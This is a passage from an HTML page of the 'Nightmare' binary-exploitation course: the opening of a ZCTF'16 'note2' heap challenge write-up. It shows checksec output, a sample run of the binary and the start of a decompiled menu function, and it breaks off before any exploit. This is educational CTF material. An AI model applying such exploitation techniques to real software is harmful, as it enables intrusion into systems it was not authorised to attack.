@@ -1,0 +1,842 @@
+<!DOCTYPE HTML>
+<html lang="en" class="sidebar-visible no-js navy">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>ZCTF'16: note2 - Nightmare</title>
+        
+
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <meta name="description" content="Nightmare: an intro to binary exploitation / reverse engineering course based around CTF challenges.">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff" />
+
+        <link rel="shortcut icon" href="../../favicon.png">
+        <link rel="stylesheet" href="../../css/variables.css">
+        <link rel="stylesheet" href="../../css/general.css">
+        <link rel="stylesheet" href="../../css/chrome.css">
+        <link rel="stylesheet" href="../../css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
+        <link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css">
+        <link href="https://fonts.googleapis.com/css?family=Source+Code+Pro:500" rel="stylesheet" type="text/css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../../highlight.css">
+        <link rel="stylesheet" href="../../tomorrow-night.css">
+        <link rel="stylesheet" href="../../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+        
+
+        
+    </head>
+    <body>
+        <!-- Provide site root to javascript -->
+        <script type="text/javascript">
+            var path_to_root = "../../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "navy";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script type="text/javascript">
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script type="text/javascript">
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('no-js')
+            html.classList.remove('navy')
+            html.classList.add(theme);
+            html.classList.add('js');
+        </script>
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script type="text/javascript">
+            var html = document.querySelector('html');
+            var sidebar = 'hidden';
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            }
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div id="sidebar-scrollbox" class="sidebar-scrollbox">
+                <ol class="chapter"><li class="expanded affix "><a href="../../index.html">Nightmare</a></li><li class="expanded "><a href="../../00-intro/index.html"><strong aria-hidden="true">1.</strong> Introduction</a></li><li><ol class="section"><li class="expanded "><a href="../../01-intro_assembly/assembly/index.html"><strong aria-hidden="true">1.1.</strong> Assembly</a></li><li class="expanded "><a href="../../01-intro_assembly/reversing_assembly/index.html"><strong aria-hidden="true">1.2.</strong> Reversing Assembly</a></li><li class="expanded "><a href="../../02-intro_tooling/ghidra/index.html"><strong aria-hidden="true">1.3.</strong> Reversing with GHIDRA</a></li><li class="expanded "><a href="../../02-intro_tooling/gdb-gef/index.html"><strong aria-hidden="true">1.4.</strong> Debugging with GDB</a></li><li class="expanded "><a href="../../02-intro_tooling/pwntools/index.html"><strong aria-hidden="true">1.5.</strong> Scripting with Python pwntools</a></li><li class="expanded "><a href="../../03-beginner_re/csaw18_x86tour_pt1/index.html"><strong aria-hidden="true">1.6.</strong> Beginner Reversing</a></li><li><ol class="section"><li class="expanded "><a href="../../03-beginner_re/csaw19_beleaf/index.html"><strong aria-hidden="true">1.6.1.</strong> CSAW'19: Beleaf</a></li><li class="expanded "><a href="../../03-beginner_re/helithumper_re/index.html"><strong aria-hidden="true">1.6.2.</strong> Helithumper RE</a></li><li class="expanded "><a href="../../03-beginner_re/pico18_strings/index.html"><strong aria-hidden="true">1.6.3.</strong> Pico'18: Strings</a></li></ol></li></ol></li><li class="expanded "><a href="../../04-bof_variable/csaw18_boi/index.html"><strong aria-hidden="true">2.</strong> Stack Buffer Overflows</a></li><li><ol class="section"><li class="expanded "><a href="../../04-bof_variable/tamu19_pwn1/index.html"><strong aria-hidden="true">2.1.</strong> TAMU'19: Pwn1</a></li><li class="expanded "><a href="../../04-bof_variable/tw17_justdoit/index.html"><strong aria-hidden="true">2.2.</strong> TokyoWesterns'17: JustDoIt</a></li><li class="expanded "><a href="../../05-bof_callfunction/csaw16_warmup/index.html"><strong aria-hidden="true">2.3.</strong> CSAW'16: Warmup</a></li><li class="expanded "><a href="../../05-bof_callfunction/csaw18_getit/index.html"><strong aria-hidden="true">2.4.</strong> CSAW'18: Getit</a></li><li class="expanded "><a href="../../05-bof_callfunction/tu17_vulnchat/index.html"><strong aria-hidden="true">2.5.</strong> TU'17: Vulnchat</a></li><li><ol class="section"><li class="expanded "><a href="../../5.1-mitigation_aslr_pie/index.html"><strong aria-hidden="true">2.5.1.</strong> ASLR/PIE</a></li></ol></li><li class="expanded "><a href="../../06-bof_shellcode/csaw17_pilot/index.html"><strong aria-hidden="true">2.6.</strong> CSAW'17: Pilot</a></li><li class="expanded "><a href="../../06-bof_shellcode/tamu19_pwn3/index.html"><strong aria-hidden="true">2.7.</strong> TAMU'19: Pwn3</a></li><li class="expanded "><a href="../../06-bof_shellcode/tu18_shellaeasy/index.html"><strong aria-hidden="true">2.8.</strong> TU'18: Shellaeasy</a></li><li><ol class="section"><li class="expanded "><a href="../../6.1-mitigation_nx/index.html"><strong aria-hidden="true">2.8.1.</strong> NX/XN/DEP</a></li></ol></li><li class="expanded "><a href="../../07-bof_static/bkp16_simplecalc/index.html"><strong aria-hidden="true">2.9.</strong> BKP'16: SimpleCalc</a></li><li class="expanded "><a href="../../07-bof_static/dcquals16_feedme/index.html"><strong aria-hidden="true">2.10.</strong> DCQuals'16: Feedme</a></li><li class="expanded "><a href="../../07-bof_static/dcquals19_speedrun1/index.html"><strong aria-hidden="true">2.11.</strong> DCQuals'19: Speedrun1</a></li><li><ol class="section"><li class="expanded "><a href="../../7.1-mitigation_canary/index.html"><strong aria-hidden="true">2.11.1.</strong> Canaries/Cookies</a></li><li class="expanded "><a href="../../7.2-mitigation_relro/index.html"><strong aria-hidden="true">2.11.2.</strong> RELRO</a></li></ol></li><li class="expanded "><a href="../../08-bof_dynamic/csaw19_babyboi/index.html"><strong aria-hidden="true">2.12.</strong> CSAW'19: Babyboi</a></li><li class="expanded "><a href="../../08-bof_dynamic/csawquals17_svc/index.html"><strong aria-hidden="true">2.13.</strong> CSAW Quals'17: SVC</a></li><li class="expanded "><a href="../../08-bof_dynamic/fb19_overfloat/index.html"><strong aria-hidden="true">2.14.</strong> FB'19: Overfloat</a></li><li class="expanded "><a href="../../08-bof_dynamic/hs19_storytime/index.html"><strong aria-hidden="true">2.15.</strong> HS'19: Storytime</a></li></ol></li><li class="expanded "><a href="../../fmt.html"><strong aria-hidden="true">3.</strong> Format Strings</a></li><li><ol class="section"><li class="expanded "><a href="../../10-fmt_strings/backdoor17_bbpwn/index.html"><strong aria-hidden="true">3.1.</strong> Backdoor'17: bbpwn</a></li><li class="expanded "><a href="../../10-fmt_strings/pico18_echo/index.html"><strong aria-hidden="true">3.2.</strong> PicoCTF'18: echo</a></li><li class="expanded "><a href="../../10-fmt_strings/tw16_greeting/index.html"><strong aria-hidden="true">3.3.</strong> TokyoWesterns'16: Greeting</a></li></ol></li><li class="expanded "><a href="../../indexing.html"><strong aria-hidden="true">4.</strong> Array Indexing</a></li><li><ol class="section"><li class="expanded "><a href="../../11-index/csaw18_doubletrouble/index.html"><strong aria-hidden="true">4.1.</strong> CSAW'18: DoubleTrouble</a></li><li class="expanded "><a href="../../11-index/dcq16_xkcd/index.html"><strong aria-hidden="true">4.2.</strong> DCQ'16: XKCD</a></li><li class="expanded "><a href="../../11-index/sunshinectf2017_alternatesolution/index.html"><strong aria-hidden="true">4.3.</strong> SunshineCTF'17: Alt. Solution</a></li><li class="expanded "><a href="../../11-index/swampctf19_dreamheaps/index.html"><strong aria-hidden="true">4.4.</strong> SwampCTF'19: Dreamheaps</a></li></ol></li><li class="expanded "><a href="../../randomness.html"><strong aria-hidden="true">5.</strong> Bad Seed</a></li><li><ol class="section"><li class="expanded "><a href="../../09-bad_seed/h3_time/index.html"><strong aria-hidden="true">5.1.</strong> H3: Time</a></li><li class="expanded "><a href="../../09-bad_seed/hsctf19_tuxtalkshow/reamde.html"><strong aria-hidden="true">5.2.</strong> HSCTF'19: Tuxtalkshow</a></li><li class="expanded "><a href="../../09-bad_seed/sunshinectf17_prepared/index.html"><strong aria-hidden="true">5.3.</strong> SunshineCTF'17: Prepared</a></li></ol></li><li class="expanded "><a href="../../z3_angr.html"><strong aria-hidden="true">6.</strong> Z3 &amp; Symbolic Execution (angr)</a></li><li><ol class="section"><li class="expanded "><a href="../../12-z3/hs19_abyte/index.html"><strong aria-hidden="true">6.1.</strong> HS'19: abyte</a></li><li class="expanded "><a href="../../12-z3/tokyowesterns17_revrevrev/index.html"><strong aria-hidden="true">6.2.</strong> TokyoWesterns'17: revrevrev</a></li><li class="expanded "><a href="../../12-z3/tuctf_future/index.html"><strong aria-hidden="true">6.3.</strong> TUCTF: Future</a></li><li class="expanded "><a href="../../13-angr/defcamp_r100/index.html"><strong aria-hidden="true">6.4.</strong> DEFCamp: r100</a></li><li class="expanded "><a href="../../13-angr/plaid19_icancount/index.html"><strong aria-hidden="true">6.5.</strong> PlaidCTF'19: icancount</a></li><li class="expanded "><a href="../../13-angr/securityfest_fairlight/index.html"><strong aria-hidden="true">6.6.</strong> SecurityFest Fairlight</a></li></ol></li><li class="expanded "><a href="../../rop.html"><strong aria-hidden="true">7.</strong> Return Oriented Programming (ROP)</a></li><li><ol class="section"><li class="expanded "><a href="../../15-partial_overwrite/index.html"><strong aria-hidden="true">7.1.</strong> Partial Overwrite</a></li><li><ol class="section"><li class="expanded "><a href="../../15-partial_overwrite/hacklu15_stackstuff/index.html"><strong aria-hidden="true">7.1.1.</strong> Hack.lu'15: stackstuff</a></li><li class="expanded "><a href="../../15-partial_overwrite/tamu19_pwn2/index.html"><strong aria-hidden="true">7.1.2.</strong> TAMU'19: pwn2</a></li><li class="expanded "><a href="../../15-partial_overwrite/tuctf17_vulnchat2/index.html"><strong aria-hidden="true">7.1.3.</strong> TUCTF'17: vulnchat2</a></li></ol></li><li class="expanded "><a href="../../17-stack_pivot/index.html"><strong aria-hidden="true">7.2.</strong> Stack Pivoting</a></li><li><ol class="section"><li class="expanded "><a href="../../17-stack_pivot/dcquals19_speedrun4/index.html"><strong aria-hidden="true">7.2.1.</strong> DCQuals'19: speedrun4</a></li><li class="expanded "><a href="../../17-stack_pivot/insomnihack18_onewrite/index.html"><strong aria-hidden="true">7.2.2.</strong> Insomnihack'18: onewrite</a></li><li class="expanded "><a href="../../17-stack_pivot/seccon19_sum/index.html"><strong aria-hidden="true">7.2.3.</strong> SECCON'19: sum</a></li><li class="expanded "><a href="../../17-stack_pivot/xctf16_b0verflow/index.html"><strong aria-hidden="true">7.2.4.</strong> XCTF'16: b0verflow</a></li></ol></li><li class="expanded "><a href="../../16-srop/index.html"><strong aria-hidden="true">7.3.</strong> SIGROP (SROP)</a></li><li><ol class="section"><li class="expanded "><a href="../../16-srop/backdoor_funsignals/index.html"><strong aria-hidden="true">7.3.1.</strong> BackdoorCTF: funsigals</a></li><li class="expanded "><a href="../../16-srop/csaw19_smallboi/index.html"><strong aria-hidden="true">7.3.2.</strong> CSAW'19: smallboi</a></li><li class="expanded "><a href="../../16-srop/inctf17_stupidrop/index.html"><strong aria-hidden="true">7.3.3.</strong> InCTF'17: stupidrop</a></li><li class="expanded "><a href="../../16-srop/swamp19_syscaller/index.html"><strong aria-hidden="true">7.3.4.</strong> SwampCTF'19: syscaller</a></li></ol></li><li class="expanded "><a href="../../18-ret2_csu_dl/index.html"><strong aria-hidden="true">7.4.</strong> ret2csu</a></li><li><ol class="section"><li class="expanded "><a href="../../18-ret2_csu_dl/0ctf18_babystack/index.html"><strong aria-hidden="true">7.4.1.</strong> 0CTF'18: babystack</a></li><li class="expanded "><a href="../../18-ret2_csu_dl/ropemporium_ret2csu/index.html"><strong aria-hidden="true">7.4.2.</strong> ROPEmporium</a></li></ol></li><li class="expanded "><a href="../../14-ret_2_system/index.html"><strong aria-hidden="true">7.5.</strong> ret2system</a></li><li><ol class="section"><li class="expanded "><a href="../../14-ret_2_system/asis17_marymorton/index.html"><strong aria-hidden="true">7.5.1.</strong> ASIS'17: marymorton</a></li><li class="expanded "><a href="../../14-ret_2_system/hxp18_poorCanary/index.html"><strong aria-hidden="true">7.5.2.</strong> HXP'18: poorCanary</a></li><li class="expanded "><a href="../../14-ret_2_system/tu_guestbook/index.html"><strong aria-hidden="true">7.5.3.</strong> TUCTF: guestbook</a></li></ol></li></ol></li><li class="expanded "><a href="../../25-heap/index.html"><strong aria-hidden="true">8.</strong> Heap Exploitation</a></li><li><ol class="section"><li class="expanded "><a href="../../27-edit_free_chunk/double_free_explanation/index.html"><strong aria-hidden="true">8.1.</strong> Double Frees</a></li><li class="expanded "><a href="../../27-edit_free_chunk/heap_consolidation_explanation/index.html"><strong aria-hidden="true">8.2.</strong> Heap Consolidation</a></li><li class="expanded "><a href="../../27-edit_free_chunk/uaf_explanation/index.html"><strong aria-hidden="true">8.3.</strong> Use-after-Frees</a></li><li class="expanded "><a href="../../24-heap_overflow/protostar_heap0/index.html"><strong aria-hidden="true">8.4.</strong> Protostar: heap0</a></li><li class="expanded "><a href="../../24-heap_overflow/protostar_heap1/index.html"><strong aria-hidden="true">8.5.</strong> Protostar: heap1</a></li><li class="expanded "><a href="../../24-heap_overflow/protostar_heap2/reamdme.html"><strong aria-hidden="true">8.6.</strong> Protostar: heap2</a></li><li class="expanded "><a href="../../30-unlink/unlink_explanation/index.html"><strong aria-hidden="true">8.7.</strong> unlink() Exploitation</a></li><li><ol class="section"><li class="expanded "><a href="../../30-unlink/hitcon14_stkof/index.html"><strong aria-hidden="true">8.7.1.</strong> HITCON'14: stkof</a></li><li class="expanded "><a href="../../30-unlink/zctf16_note2/index.html" class="active"><strong aria-hidden="true">8.7.2.</strong> ZCTF'16: note2</a></li></ol></li><li class="expanded "><a href="../../26-heap_grooming/explanation_heap_grooming/index.html"><strong aria-hidden="true">8.8.</strong> Heap Grooming</a></li><li><ol class="section"><li class="expanded "><a href="../../26-heap_grooming/pico_areyouroot/index.html"><strong aria-hidden="true">8.8.1.</strong> PicoCTF: areyouroot</a></li><li class="expanded "><a href="../../26-heap_grooming/swamp19_heapgolf/index.html"><strong aria-hidden="true">8.8.2.</strong> SwampCTF'19: Heap Golf</a></li></ol></li><li class="expanded "><a href="../../28-fastbin_attack/explanation_fastbinAttack/index.html"><strong aria-hidden="true">8.9.</strong> Fastbin Attack</a></li><li><ol class="section"><li class="expanded "><a href="../../28-fastbin_attack/0ctf_babyheap/index.html"><strong aria-hidden="true">8.9.1.</strong> 0CTF: babyheap</a></li><li class="expanded "><a href="../../28-fastbin_attack/csaw17_auir/index.html"><strong aria-hidden="true">8.9.2.</strong> CSAW'17: Auir</a></li></ol></li><li class="expanded "><a href="../../31-unsortedbin_attack/unsorted_explanation/index.html"><strong aria-hidden="true">8.10.</strong> Unsortedbin Attack</a></li><li><ol class="section"><li class="expanded "><a href="../../31-unsortedbin_attack/0ctf16_zerostorage/index.html"><strong aria-hidden="true">8.10.1.</strong> 0CTF'16: zerostorage</a></li><li class="expanded "><a href="../../31-unsortedbin_attack/hitcon_magicheap/index.html"><strong aria-hidden="true">8.10.2.</strong> HITCON: magicheap</a></li></ol></li><li class="expanded "><a href="../../32-largebin_attack/largebin_explanation0/index.html"><strong aria-hidden="true">8.11.</strong> Largebin Attack (part 1)</a></li><li class="expanded "><a href="../../32-largebin_attack/largebin_explanation1/index.html"><strong aria-hidden="true">8.12.</strong> Largebin Attack (part 2)</a></li><li class="expanded "><a href="../../29-tcache/tcache_explanation/index.html"><strong aria-hidden="true">8.13.</strong> GLibc Tcache</a></li><li><ol class="section"><li class="expanded "><a href="../../29-tcache/dcquals19_babyheap/index.html"><strong aria-hidden="true">8.13.1.</strong> DCQuals'19: babyheap</a></li><li class="expanded "><a href="../../29-tcache/plaid19_cpp/index.html"><strong aria-hidden="true">8.13.2.</strong> PlaidCTF'19: cpp</a></li><li class="expanded "><a href="../../44-more_tcache/csaw19_popping_caps0/index.html"><strong aria-hidden="true">8.13.3.</strong> CSAW'19: Popping Caps 1</a></li><li class="expanded "><a href="../../44-more_tcache/csaw19_popping_caps1/index.html"><strong aria-hidden="true">8.13.4.</strong> CSAW'19: Popping Caps 2</a></li></ol></li><li class="expanded "><a href="../../39-house_of_spirit/house_spirit_exp/index.html"><strong aria-hidden="true">8.14.</strong> House of Spirit</a></li><li><ol class="section"><li class="expanded "><a href="../../39-house_of_spirit/hacklu14_oreo/index.html"><strong aria-hidden="true">8.14.1.</strong> Hack.lu'14: Oreo</a></li></ol></li><li class="expanded "><a href="../../40-house_of_lore/house_lore_exp/index.html"><strong aria-hidden="true">8.15.</strong> House of Lore</a></li><li class="expanded "><a href="../../41-house_of_force/house_force_exp/index.html"><strong aria-hidden="true">8.16.</strong> House of Force</a></li><li><ol class="section"><li class="expanded "><a href="../../41-house_of_force/bkp16_cookbook/index.html"><strong aria-hidden="true">8.16.1.</strong> BKP'16: Cookbook</a></li></ol></li><li class="expanded "><a href="../../42-house_of_einherjar/house_einherjar_exp/index.html"><strong aria-hidden="true">8.17.</strong> House of Einherjar</a></li><li class="expanded "><a href="../../43-house_of_orange/house_orange_exp/index.html"><strong aria-hidden="true">8.18.</strong> House of Orange</a></li><li class="expanded "><a href="../../33-custom_misc_heap/index.html"><strong aria-hidden="true">8.19.</strong> Miscellaneous</a></li><li><ol class="section"><li class="expanded "><a href="../../33-custom_misc_heap/csaw17_minesweeper/index.html"><strong aria-hidden="true">8.19.1.</strong> CSAW'17: Minesweeper</a></li><li class="expanded "><a href="../../33-custom_misc_heap/csaw18_alienVSsamurai/index.html"><strong aria-hidden="true">8.19.2.</strong> CSAW'18: alienVSsamurai</a></li><li class="expanded "><a href="../../33-custom_misc_heap/csaw19_traveller/index.html"><strong aria-hidden="true">8.19.3.</strong> CSAW'19: Traveller</a></li></ol></li></ol></li><li class="expanded "><a href="../../35-integer_exploitation/index.html"><strong aria-hidden="true">9.</strong> Integer Overflows</a></li><li><ol class="section"><li class="expanded "><a href="../../35-integer_exploitation/int_overflow_post/index.html"><strong aria-hidden="true">9.1.</strong> sploitFUN: vuln</a></li><li class="expanded "><a href="../../35-integer_exploitation/puzzle/index.html"><strong aria-hidden="true">9.2.</strong> Puzzle</a></li><li class="expanded "><a href="../../35-integer_exploitation/signed_unsigned/index.html"><strong aria-hidden="true">9.3.</strong> Signed vs. Unsigned</a></li></ol></li><li class="expanded "><a href="../../37-fs_exploitation/index.html"><strong aria-hidden="true">10.</strong> FILE Exploitation</a></li><li><ol class="section"><li class="expanded "><a href="../../37-fs_exploitation/swamp19_badfile/index.html"><strong aria-hidden="true">10.1.</strong> SwampCTF'19: Bad File</a></li></ol></li><li class="expanded "><a href="../../grabbag.html"><strong aria-hidden="true">11.</strong> Grab Bag</a></li><li><ol class="section"><li class="expanded "><a href="../../19-shellcoding_pt1/index.html"><strong aria-hidden="true">11.1.</strong> Shellcoding</a></li><li><ol class="section"><li class="expanded "><a href="../../19-shellcoding_pt1/csaw18_shellpointcode/index.html"><strong aria-hidden="true">11.1.1.</strong> CSAW'18: Shellpointcode</a></li><li class="expanded "><a href="../../19-shellcoding_pt1/defconquals19_s3/index.html"><strong aria-hidden="true">11.1.2.</strong> DCQuals'19: S3</a></li><li class="expanded "><a href="../../19-shellcoding_pt1/defconquals19_s6/index.html"><strong aria-hidden="true">11.1.3.</strong> DCQuals'19: S6</a></li></ol></li><li class="expanded "><a href="../../20-patching_and_jumping/index.html"><strong aria-hidden="true">11.2.</strong> Patching</a></li><li><ol class="section"><li class="expanded "><a href="../../20-patching_and_jumping/csawquals16_gametime/index.html"><strong aria-hidden="true">11.2.1.</strong> CSAW Quals'16: gametime</a></li><li class="expanded "><a href="../../20-patching_and_jumping/dcquals18_elfcrumble/index.html"><strong aria-hidden="true">11.2.2.</strong> DCQuals'18: ELFCrumble</a></li><li class="expanded "><a href="../../20-patching_and_jumping/plaid19_ppp/index.html"><strong aria-hidden="true">11.2.3.</strong> Plaid'19: PPP</a></li></ol></li><li class="expanded "><a href="../../21-dot_net/index.html"><strong aria-hidden="true">11.3.</strong> .NET</a></li><li><ol class="section"><li class="expanded "><a href="../../21-dot_net/bikinibonanza/index.html"><strong aria-hidden="true">11.3.1.</strong> Bikinibonanza</a></li><li class="expanded "><a href="../../21-dot_net/dot_net/index.html"><strong aria-hidden="true">11.3.2.</strong> CSAW'13: DotNetReversing</a></li><li class="expanded "><a href="../../21-dot_net/whitehat18_re06/index.html"><strong aria-hidden="true">11.3.3.</strong> Whitehat'18: re06</a></li></ol></li><li class="expanded "><a href="../../36-obfuscated_reversing/index.html"><strong aria-hidden="true">11.4.</strong> Obfuscation</a></li><li><ol class="section"><li class="expanded "><a href="../../36-obfuscated_reversing/bkp16_unholy/index.html"><strong aria-hidden="true">11.4.1.</strong> BKP'16: Unholy</a></li><li class="expanded "><a href="../../36-obfuscated_reversing/csaw15_wyvern/index.html"><strong aria-hidden="true">11.4.2.</strong> CSAW'15: Wyvern</a></li><li class="expanded "><a href="../../36-obfuscated_reversing/csaw17_prophecy/index.html"><strong aria-hidden="true">11.4.3.</strong> CSAW'17: Prophecy</a></li><li class="expanded "><a href="../../22-movfuscation/index.html"><strong aria-hidden="true">11.4.4.</strong> MOVfuscation</a></li><li><ol class="section"><li class="expanded "><a href="../../22-movfuscation/asis18_babyc/index.html"><strong aria-hidden="true">11.4.4.1.</strong> ASIS'18: babyc</a></li><li class="expanded "><a href="../../22-movfuscation/recon_movfuscated/index.html"><strong aria-hidden="true">11.4.4.2.</strong> RECON: movfuscated</a></li><li class="expanded "><a href="../../22-movfuscation/swamp19_future/index.html"><strong aria-hidden="true">11.4.4.3.</strong> SwampCTF'19: Future Fun</a></li></ol></li></ol></li><li class="expanded "><a href="../../23-custom_architecture/index.html"><strong aria-hidden="true">11.5.</strong> Custom Architecture</a></li><li><ol class="section"><li class="expanded "><a href="../../23-custom_architecture/h3_h3machine0/index.html"><strong aria-hidden="true">11.5.1.</strong> H3Machine (part 1)</a></li><li class="expanded "><a href="../../23-custom_architecture/h3_h3machine1/index.html"><strong aria-hidden="true">11.5.2.</strong> H3Machine (part 2)</a></li><li class="expanded "><a href="../../23-custom_architecture/h3_h3machine2/index.html"><strong aria-hidden="true">11.5.3.</strong> H3Machine (part 3)</a></li><li class="expanded "><a href="../../23-custom_architecture/h3_h3machine3/index.html"><strong aria-hidden="true">11.5.4.</strong> H3Machine (part 4)</a></li></ol></li><li class="expanded "><a href="../../34-emulated_targets/index.html"><strong aria-hidden="true">11.6.</strong> Emulation</a></li><li><ol class="section"><li class="expanded "><a href="../../34-emulated_targets/csaw15_hackingtime/index.html"><strong aria-hidden="true">11.6.1.</strong> CSAW'15: Hackingtime</a></li><li class="expanded "><a href="../../34-emulated_targets/csaw17_realism/index.html"><strong aria-hidden="true">11.6.2.</strong> CSAW'17: Realism</a></li><li class="expanded "><a href="../../34-emulated_targets/csaw18_x86_pt2/index.html"><strong aria-hidden="true">11.6.3.</strong> CSAW'18: x86 Pt.2</a></li></ol></li><li class="expanded "><a href="../../38-grab_bad/uninit_vars/index.html"><strong aria-hidden="true">11.7.</strong> Uninitialized Variables</a></li><li class="expanded "><a href="../../38-grab_bad/csaw18_doubletrouble/index.html"><strong aria-hidden="true">11.8.</strong> CSAW'18: Doubletrouble</a></li><li class="expanded "><a href="../../38-grab_bad/csaw19_gibberishCheck/index.html"><strong aria-hidden="true">11.9.</strong> CSAW'19: Gibberishcheck</a></li><li class="expanded "><a href="../../38-grab_bad/hackim19_shop/index.html"><strong aria-hidden="true">11.10.</strong> HackIM'19: Shop</a></li></ol></li><li class="expanded "><a href="../../next/index.html">What's Next</a></li><li class="expanded affix "><a href="../../references/index.html">References</a></li></ol>
+            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                
+                <div id="menu-bar" class="menu-bar">
+                    <div id="menu-bar-sticky-container">
+                        <div class="left-buttons">
+                            <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                                <i class="fa fa-bars"></i>
+                            </button>
+                            <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                                <i class="fa fa-paint-brush"></i>
+                            </button>
+                            <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                                <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                                <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                                <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                                <li role="none"><button role="menuitem" class="theme" id="navy">Navy (default)</button></li>
+                                <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                            </ul>
+                            
+                            <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                                <i class="fa fa-search"></i>
+                            </button>
+                            
+                        </div>
+
+                        <h1 class="menu-title">Nightmare</h1>
+
+                        <div class="right-buttons">
+                            <a href="../../print.html" title="Print this book" aria-label="Print this book">
+                                <i id="print-button" class="fa fa-print"></i>
+                            </a>
+                            
+                            <a href="https://github.com/guyinatuxedo/nightmare/" title="Git repository" aria-label="Git repository">
+                                <i id="git-repository-button" class="fa fa-github"></i>
+                            </a>
+                            
+                        </div>
+                    </div>
+                </div>
+
+                
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" name="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+                
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script type="text/javascript">
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1><a class="header" href="#zctf-2016-note2" id="zctf-2016-note2">zctf 2016 note2</a></h1>
+<p>Let's see what we are dealing with:</p>
+<pre><code>$    file note2
+note2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.24, BuildID[sha1]=46dca2e49f923813b316f12858e7e0f42e4a82c3, stripped
+$    pwn checksec note2
+[*] '/home/guyinatuxedo/Desktop/zctf/note2'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+$    ./libc-2.23.so
+GNU C Library (Ubuntu GLIBC 2.23-0ubuntu11) stable release version 2.23, by Roland McGrath et al.
+Copyright (C) 2016 Free Software Foundation, Inc.
+This is free software; see the source for copying conditions.
+There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
+PARTICULAR PURPOSE.
+Compiled by GNU CC version 5.4.0 20160609.
+Available extensions:
+    crypt add-on version 2.1 by Michael Glad and others
+    GNU Libidn by Simon Josefsson
+    Native POSIX Threads Library by Ulrich Drepper et al
+    BIND-8.2.3-T5B
+libc ABIs: UNIQUE IFUNC
+For bug reporting instructions, please see:
+&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.
+$    ./note2
+Input your name:
+15935728
+Input your address:
+15935728
+1.New note
+2.Show  note
+3.Edit note
+4.Delete note
+5.Quit
+option---&gt;&gt;
+</code></pre>
+<p>So we are dealing with a <code>64</code> bit elf binary, with a stack canary and NX (but no RELRO). We also see that we are given a libc version <code>2.23</code> (I'm not sure if that is the one originally associated with the challenge, but that is what I will use here). When we run the binary, it prompts us for a name and an address. After that we get a menu where we can make a not, show a not, edit a note, and delete a note.</p>
+<h3><a class="header" href="#reversing" id="reversing">Reversing</a></h3>
+<p>Looking through the list of functions in Ghidra (or checking the xreferences to certain strings and tracing back where the functions that contain those strings are called) we find this function which acts as the menu:</p>
+<pre><code>void menu(void)
+
+{
+  undefined4 uVar1;
+ 
+  setvbuf(stdin,(char *)0x0,2,0);
+  setvbuf(stdout,(char *)0x0,2,0);
+  setvbuf(stderr,(char *)0x0,2,0);
+  alarm(0x3c);
+  puts(&quot;Input your name:&quot;);
+  callRead(&amp;name,0x40,10);
